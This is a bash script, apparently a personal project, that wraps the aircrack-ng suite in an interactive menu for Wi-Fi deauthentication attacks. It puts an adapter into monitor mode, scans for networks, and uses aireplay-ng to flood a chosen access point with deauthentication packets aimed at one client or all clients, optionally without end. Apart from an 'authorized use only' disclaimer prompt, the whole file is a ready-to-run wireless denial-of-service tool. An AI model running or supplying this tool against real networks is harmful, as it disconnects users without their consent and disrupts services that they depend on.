#!/bin/bash

# ==============================================
# Wi-Fi Deauthentication Tool (Enhanced Version)
# Author: Harshit Pandey
# Disclaimer: For educational/authorized use only!
# ==============================================

# Colors for better UI
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Defaults
wifi_interface="wlan0"
wifi_bssid=""
channel=""
client_mac=""
log_file="wifi_deauth.log"

# Check if required tools are installed
check_dependencies() {
    if ! command -v airodump-ng &> /dev/null || ! command -v aireplay-ng &> /dev/null; then
        echo -e "${RED}Error: aircrack-ng suite not installed.${NC}"
        echo -e "Install with: ${GREEN}sudo apt install aircrack-ng${NC}"
        exit 1
    fi
}

# Verify Wi-Fi interface exists
check_interface() {
    if ! iwconfig $wifi_interface &> /dev/null; then
        echo -e "${RED}Error: Interface $wifi_interface not found.${NC}"
        list_interfaces
        exit 1
    fi
}

# List available Wi-Fi interfaces
list_interfaces() {
    echo -e "\n${YELLOW}Available interfaces:${NC}"
    iwconfig | grep "IEEE 802.11" | awk '{print $1}'
}

# Enable monitor mode
enable_monitor_mode() {
    echo -e "\n${BLUE}[+] Setting $wifi_interface to monitor mode...${NC}"
    sudo airmon-ng check kill &> /dev/null
    sudo ifconfig $wifi_interface down
    sudo iwconfig $wifi_interface mode monitor
    sudo ifconfig $wifi_interface up
}

# Revert to managed mode (cleanup)
revert_managed_mode() {
    echo -e "\n${BLUE}[+] Reverting $wifi_interface to managed mode...${NC}"
    sudo ifconfig $wifi_interface down
    sudo iwconfig $wifi_interface mode managed
    sudo ifconfig $wifi_interface up
    sudo systemctl restart NetworkManager &> /dev/null
}

# Log actions to file
log_action() {
    echo "[$(date)] $1" >> $log_file
}

# Scan Wi-Fi networks
scan_wifi() {
    echo -e "\n${YELLOW}[+] Scanning for Wi-Fi networks...${NC}"
    sudo airodump-ng $wifi_interface
    log_action "Scanned networks."
}

# Select target network
select_wifi() {
    echo -e "\n${YELLOW}Enter BSSID (e.g., AA:BB:CC:DD:EE:FF):${NC}"
    read wifi_bssid
    if [[ ! $wifi_bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo -e "${RED}Invalid BSSID format!${NC}"
        return
    fi
    echo -e "${YELLOW}Enter channel:${NC}"
    read channel
    echo -e "\n${GREEN}[+] Targeting $wifi_bssid on channel $channel.${NC}"
    log_action "Selected network: $wifi_bssid (Channel $channel)"
}

# Deauth a specific client
deauth_client() {
    if [[ -z $wifi_bssid ]]; then
        echo -e "${RED}No target BSSID set! Use option 2 first.${NC}"
        return
    fi
    echo -e "\n${YELLOW}Enter client MAC (e.g., AA:BB:CC:DD:EE:FF):${NC}"
    read client_mac
    if [[ ! $client_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo -e "${RED}Invalid MAC format!${NC}"
        return
    fi
    echo -e "${YELLOW}Enter deauth packets (0=continuous):${NC}"
    read deauth_packets
    echo -e "\n${RED}[!] Sending $deauth_packets deauth packets to $client_mac...${NC}"
    log_action "Deauth attack on $client_mac (BSSID: $wifi_bssid)"
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid -c $client_mac $wifi_interface
}

# Deauth all clients
deauth_all() {
    if [[ -z $wifi_bssid ]]; then
        echo -e "${RED}No target BSSID set! Use option 2 first.${NC}"
        return
    fi
    read -p "[!] Deauth ALL clients from $wifi_bssid? (y/n) " confirm
    if [[ $confirm != "y" ]]; then return; fi
    echo -e "${YELLOW}Enter deauth packets (0=continuous):${NC}"
    read deauth_packets
    echo -e "\n${RED}[!] Sending $deauth_packets deauth packets to ALL clients...${NC}"
    log_action "Mass deauth attack on $wifi_bssid"
    aireplay-ng --deauth $deauth_packets -a $wifi_bssid $wifi_interface
}

# Check adapter status
check_status() {
    echo -e "\n${YELLOW}[+] Wi-Fi Adapter Status:${NC}"
    iwconfig $wifi_interface
}

# Change interface
change_interface() {
    list_interfaces
    echo -e "\n${YELLOW}Enter new interface:${NC}"
    read new_interface
    wifi_interface=$new_interface
    echo -e "${GREEN}[+] Interface set to $wifi_interface.${NC}"
    log_action "Changed interface to $wifi_interface"
}

# Display menu
display_menu() {
    clear
    echo -e "${BLUE}"
    echo "====================================="
    echo "    Wi-Fi Deauthentication Tool       "
    echo "====================================="
    echo -e "${NC}"
    echo -e "${GREEN}1. Scan for Wi-Fi networks"
    echo "2. Select target network (BSSID & channel)"
    echo "3. Deauthenticate a specific client"
    echo "4. Deauthenticate ALL clients"
    echo "5. Continuous Deauth (until stopped)"
    echo "6. Check Wi-Fi adapter status"
    echo "7. Change Wi-Fi interface"
    echo -e "8. Exit${NC}"
    echo ""
    echo -e "${YELLOW}Current target: $wifi_bssid (Channel $channel)${NC}"
    echo -e "${YELLOW}Interface: $wifi_interface${NC}"
    echo ""
    echo -e "Enter choice:"
}

# Legal disclaimer
disclaimer() {
    clear
    echo -e "${RED}"
    echo "==========================================="
    echo "           DISCLAIMER & WARNING            "
    echo "==========================================="
    echo -e "${NC}"
    echo "This tool is for educational/authorized testing ONLY."
    echo "Unauthorized use may be illegal and unethical."
    echo ""
    echo "By using this tool, you agree to:"
    echo "- Use it only on networks you own/have permission."
    echo "- Not engage in any malicious activities."
    echo ""
    read -p "Do you agree? (y/n) " agree
    if [[ $agree != "y" ]]; then
        echo -e "${RED}Exiting...${NC}"
        exit 0
    fi
    log_action "User accepted disclaimer."
}

# Main execution
main() {
    check_dependencies
    disclaimer
    enable_monitor_mode
    trap revert_managed_mode EXIT  # Cleanup on exit

    while true; do
        display_menu
        read choice
        case $choice in
            1) scan_wifi ;;
            2) select_wifi ;;
            3) deauth_client ;;
            4) deauth_all ;;
            5) deauth_client ;;  # (0 packets = continuous)
            6) check_status ;;
            7) change_interface ;;
            8) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
            *) echo -e "${RED}Invalid choice!${NC}" ;;
        esac
        echo -e "\nPress Enter to continue..."
        read
    done
}

main